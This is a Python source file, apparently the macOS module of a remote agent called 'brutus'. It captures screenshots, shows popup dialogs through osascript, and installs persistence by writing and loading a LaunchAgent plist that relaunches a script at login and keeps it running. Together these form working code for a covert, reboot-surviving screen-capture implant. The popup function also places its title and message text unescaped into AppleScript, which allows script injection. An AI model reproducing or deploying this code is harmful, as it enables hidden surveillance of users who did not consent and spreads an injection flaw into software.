import io
import subprocess
import tempfile
from pathlib import Path

from brutus.platform._base import PlatformBase

_PLIST_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.brutus.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/python3</string>
    <string>{script}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
"""


class MacOSPlatform(PlatformBase):
    def screenshot(self) -> bytes:
        import pyautogui

        buf = io.BytesIO()
        pyautogui.screenshot().save(buf, format="PNG")
        return buf.getvalue()

    def show_popup(self, title: str, message: str) -> None:
        try:
            script = f'display dialog "{message}" with title "{title}" buttons {{"OK"}}'
            subprocess.run(["osascript", "-e", script], check=False, timeout=10)
        except Exception:
            pass

    def install_persistence(self, script_path: str) -> bool:
        try:
            launch_agents = Path.home() / "Library" / "LaunchAgents"
            launch_agents.mkdir(parents=True, exist_ok=True)
            plist_path = launch_agents / "com.brutus.agent.plist"
            plist_path.write_text(_PLIST_TEMPLATE.format(script=script_path))
            subprocess.run(["launchctl", "load", str(plist_path)], check=False, timeout=10)
            print(f"[persistence] launchd plist installed at {plist_path}")
            return True
        except Exception as exc:
            print(f"[persistence] failed: {exc}")
            return False

    def temp_dir(self) -> Path:
        return Path(tempfile.gettempdir())
